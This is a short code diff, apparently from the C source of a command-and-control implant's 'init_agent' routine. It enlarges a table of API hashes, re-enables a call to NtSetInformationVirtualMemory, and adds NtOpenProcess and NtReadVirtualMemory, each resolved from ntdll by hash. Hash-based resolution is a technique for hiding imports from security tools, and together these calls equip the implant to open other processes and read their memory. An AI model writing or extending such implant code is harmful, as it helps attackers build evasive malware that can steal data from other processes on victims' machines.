@@ -29,7 +29,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[56] = { 0 };
+UINT64 ApiHashes[58] = { 0 };
 
 INT init_agent(PVOID RetAddress) {
 
@@ -204,12 +204,20 @@ INT init_agent(PVOID RetAddress) {
         return -1;
 
     //not used.
-  //  agent->apis->pNtSetInformationVirtualMemory = (t_NtSetInformationVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[54]);
-   // if (!agent->apis->pNtSetInformationVirtualMemory)
-    //    return -1;
+    agent->apis->pNtSetInformationVirtualMemory = (t_NtSetInformationVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[54]);
+    if (!agent->apis->pNtSetInformationVirtualMemory)
+        return -1;
 
     agent->apis->pNtQueryInformationProcess = (t_NtQueryInformationProcess)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[55]);
     if (!agent->apis->pNtQueryInformationProcess)
+        return -1;
+
+    agent->apis->pNtOpenProcess = (t_NtOpenProcess)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[56]);
+    if (!agent->apis->pNtOpenProcess)
+        return -1;
+
+    agent->apis->pNtReadVirtualMemory = (t_NtReadVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[57]);
+    if (!agent->apis->pNtReadVirtualMemory)
         return -1;
 
     //obtain iphlpapi apis
